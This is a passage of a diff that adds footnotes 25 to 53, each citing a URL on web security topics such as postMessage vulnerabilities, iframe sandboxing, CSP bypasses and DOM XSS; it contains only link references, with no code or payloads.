+[^25]: https://writeups.io/summaries/detailed-technical-analysis-of-sandbox-iframe-xss-challenge-solution/
+    
+[^26]: https://www.secureideas.com/blog/being-safe-and-secure-with-cross-origin-messaging
+    
+[^27]: https://nvd.nist.gov/vuln/detail/CVE-2024-55541
+    
+[^28]: https://qualityminds.com/en/angular-security-part-2-proactive-xss-protection-with-the-iframe-sandbox/
+    
+[^29]: https://www.linkedin.com/posts/bijaysenihang_what-is-cross-origin-messaging-attack-in-activity-7333377395040653312-RDv6
+    
+[^30]: https://wpscan.com/vulnerability/7fecba37-d718-4dd4-89f3-285fb36a4165/
+    
+[^31]: https://jscrambler.com/blog/improving-iframe-security
+    
+[^32]: https://www.geeksforgeeks.org/javascript/how-to-avoid-receiving-postmessages-from-attackers/
+    
+[^33]: https://www.reddit.com/r/reactjs/comments/1cfmkrs/iframe_security_risk/
+    
+[^34]: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
+    
+[^35]: https://stackoverflow.com/questions/50480198/how-to-correctly-postmessage-into-an-iframe-that-has-sandbox-attribute-enabled
+    
+[^36]: https://hackerone.com/reports/398054
+    
+[^37]: https://portswigger.net/research/using-form-hijacking-to-bypass-csp
+    
+[^38]: https://www.cobalt.io/blog/csp-and-bypasses
+    
+[^39]: https://ahmed-tarek.gitbook.io/security-notes/pentesting/wep-pen/owsap-top-10/software-and-data-integrity-failures/postmessage-vulnerabilities/postmessage-vulnerabilities
+    
+[^40]: https://infosecwriteups.com/dom-xss-exploit-using-postmessage-and-json-parse-in-iframe-attacks-fc312eaa48c2
+    
+[^41]: https://projectdiscovery.io/blog/csp-bypass-dast-nuclei-templates-v10-1-5
+    
+[^42]: https://notes.theoffsecgirl.com/04-hacking-web/04c-ataques-al-cliente
+    
+[^43]: https://notes.theoffsecgirl.com/03-descubrimiento-y-fuzzing/03b-explotando-git-expuesto
+    
+[^44]: https://notes.theoffsecgirl.com/04-hacking-web/04d-redirecciones-inseguras
+    
+[^45]: https://jub0bs.com/posts/2023-05-05-smorgasbord-of-a-bug-chain/
+    
+[^46]: https://jlajara.gitlab.io/Dom_XSS_PostMessage
+    
+[^47]: https://techcommunity.microsoft.com/blog/microsoft-entra-blog/how-to-break-the-token-theft-cyber-attack-chain/4062700
+    
+[^48]: https://www.cs.utexas.edu/~shmat/shmat_ndss13postman.pdf
+    
+[^49]: https://payatu.com/blog/postmessage-vulnerabilities/
+    
+[^50]: https://cybercx.com/blog/postmessage-vulnerabilities/
+    
+[^51]: https://bugbase.ai/blog/exploiting-post-message-vulnerabilities-for-fun-and-profit
+    
+[^52]: https://stackoverflow.com/questions/56604306/how-is-window-postmessage-secure
+    
+[^53]: https://docs.prismacloud.io/en/enterprise-edition/policy-reference/sast-policies/javascript-policies/sast-policy-74
